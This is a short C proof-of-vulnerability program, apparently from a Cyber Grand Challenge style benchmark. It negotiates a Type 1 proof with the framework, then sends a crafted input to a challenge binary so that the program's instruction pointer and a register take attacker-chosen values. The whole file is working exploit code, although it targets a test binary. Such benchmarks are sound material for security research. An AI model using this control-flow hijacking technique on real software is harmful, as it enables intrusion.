#include <libpov.h>

char exploit[] = "\x10\x87\x04\x08\n-1337\n0\n2\n1\n0\n1\n0\n6\n0\nThis is a great program Love it! Thanks for making this :) G\x24\x35\x06\x08I am done with this-\n6\n1\nHELO\n";

int main(void) {
    negotiate_type1(0xfefefefe, 0xfefefefe, 3);
    //0..7 [eax,ecx,edx,ebx,esp,ebp,esi,edi]

    int i;
    unsigned char out[8192];
    unsigned char *eip = NULL, *ebx = NULL;
    unsigned int eip_len = 0, ebx_len = 0;

    eip = append_var("TYPE1_IP", eip, &eip_len);
    ebx = append_var("TYPE1_REG", ebx, &ebx_len);
    for (i = 0; i < ebx_len; ++i)
        exploit[55 + i] = ebx[i] | 0x1;
    for (i = 0; i < eip_len; ++i)
        exploit[63 + i] = eip[i] | 0x1;
    transmit_all(STDOUT, exploit, 121);
    length_read(STDIN, out, 1);

    return 0;
}
